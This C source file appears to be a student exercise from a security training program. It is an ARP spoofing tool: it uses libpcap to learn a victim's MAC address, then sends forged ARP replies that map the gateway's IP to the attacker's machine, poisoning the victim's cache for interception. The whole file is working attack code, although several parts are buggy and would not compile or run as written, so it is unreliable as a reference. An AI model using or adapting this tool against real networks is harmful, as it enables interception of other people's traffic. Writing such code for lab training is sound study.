#include <pcap.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if.h>
#include <netdb.h>
#include <string.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>

typedef unsigned char u8;
typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;

typedef struct ARP{
	u8 des_mac[6];  // ether des mac
	u8 src_mac[6];  // ether src mac
	u16 e_type=0x0608;	   //
	u16 a_type=0x0100;
	u16 p_type=0x0008;
	u8 h_size=0x06;
	u8 p_size=0x04;
	u16 opcode;
	u8 arp_src_mac[6]; // arp src mac
	u32 *src_ip;          // arp src ip
	u8 arp_des_mac[6]; // arp des mac
	u32 *des_ip;		   // arp des ip
} ARP;

ARP GetMacAddress(ARP s_arp);
int GetIpAddress (const char * ifr, u32 *src_ip);
void Make_Packet(const u8* packet,ARP s_arp);

int main(int argc, char* argv[]) {
	//send_arp <interface> <sender ip> <target ip>
  char track[] = "컨설팅"; // "취약점", "컨설팅", "포렌식"
  char name[] = "임지환";
  struct pcap_pkthdr* header;// pcap header
  const u8* packet; // Real Packet
  const u8* packet2; // Real Packet
  ARP s_arp;
  int res;
  u8 counter_mac[6];
  u8 counter_ip[4];	
  int i = 0;
	
  char* dev = argv[1]; // eth0
  char errbuf[PCAP_ERRBUF_SIZE]; 
  
  printf("==========================================\n");
  printf("[bob7][%s]pcap_test[%s]\n", track, name);
  
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  packet = (const u8*) malloc(42); 
  s_arp.src_ip = (u32*)malloc(40);
  s_arp.des_ip = (u32*)malloc(40);

  s_arp = GetMacAddress(s_arp); // get local MAC
  GetIpAddress(argv[1],s_arp.src_ip); // get local IP
  memcpy(s_arp.des_mac,"\xff\xff\xff\xff\xff\xff",6);
  memcpy(s_arp.arp_des_mac,"\x00\x00\x00\00\x00\x00",6);
  memcpy(s_arp.arp_src_mac,s_arp.src_mac,6);
  s_arp.opcode=0x0100; //ARP ( request )  : 0001   
  inet_pton(AF_INET,argv[3],s_arp.des_ip);
  Make_Packet(packet,s_arp);
  
  pcap_sendpacket(handle,packet,42); //send packet to gateway
  
  while(true){
  	res = pcap_next_ex(handle, &header, &packet2);	// receive packet
	if (res == 0) continue;
    	if (res == -1 || res == -2) break;
	memcpy(counter_ip,(u8 *)packet2+28,4);  //victim ip
	memcpy(counter_mac,(u8 *)packet2+22,6); //victim mac
	if(memcmp((char *)counter_ip,(char *)s_arp.des_ip,6)!=-1){
		break;
	}else{
		continue;
	}
  }
  
  printf("victim mac add : ");
	for(i=0; i<6; i++){
		printf("%02x ", counter_mac[i]);  // victim mac
	}
  printf("\n");
  
  s_arp.opcode=0x0200;			//ARP ( reply )    : 0002 
  memcpy(s_arp.des_mac,counter_mac,6); //counter ethernet mac add
  memcpy(s_arp.arp_des_mac,counter_mac,6); //counter arp mac add
  
  inet_pton(AF_INET,argv[4],s_arp.src_ip); // Sender IP <-- gateway IP
  inet_pton(AF_INET,argv[3],s_arp.des_ip); // target IP <-- victim IP
  
  Make_Packet(packet,s_arp); 		// arp를 packet에 넣서 packet 만들기
  for(i=0; i<5; i++){
	pcap_sendpacket(handle,packet,42); // send packet to victim
  }
  printf("arp Success\n");
  free((void *)packet);
  free(s_arp.src_ip);
  free(s_arp.des_ip);
  pcap_close(handle);
  return 0;
}

ARP GetMacAddress(ARP s_arp){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(s.ifr_name, "eth0");
    ioctl(fd, SIOCGIFHWADDR, &s);
    int i =0;
    for (i = 0; i < 6; i++){
    s_arp.src_mac[i]=(u8)s.ifr_hwaddr.sa_data[i]; 
    }
	printf("src mac add : ");
	for(i=0; i<6; i++){
		printf("%02x ", s_arp.src_mac[i]);  // 내 맥주소 확인
	}
	printf("\n");
    return s_arp;
}

int GetIpAddress (const char * ifr, u32 *src_ip) {  
    int sockfd;  
    struct ifreq ifrq;  //Ethernet과 관련된 정보가 필요하다면 ifreq 구조체를 사용
    struct sockaddr_in * sin;  //소켓을 연결 하는데 로컬 또는 원격 끝점 주소를 지정
	
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);  
    strcpy(ifrq.ifr_name, ifr);  
	
    if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {  
        perror( "ioctl() error");  
        return -1;  
    }  
	
    sin = (struct sockaddr_in *)&ifrq.ifr_addr;  
    memcpy (src_ip, (void*)&sin->sin_addr, sizeof(sin->sin_addr));  
	
    close(sockfd);  
    return 4;  
}

void Make_Packet(const u8* packet,ARP s_arp){
  memcpy((u8*)packet,s_arp.des_mac,28);
  memcpy((u8*)packet+28,s_arp.src_ip,4);
  memcpy((u8*)packet+32,s_arp.arp_des_mac,6);
  memcpy((u8*)packet+38,s_arp.des_ip,4);
}
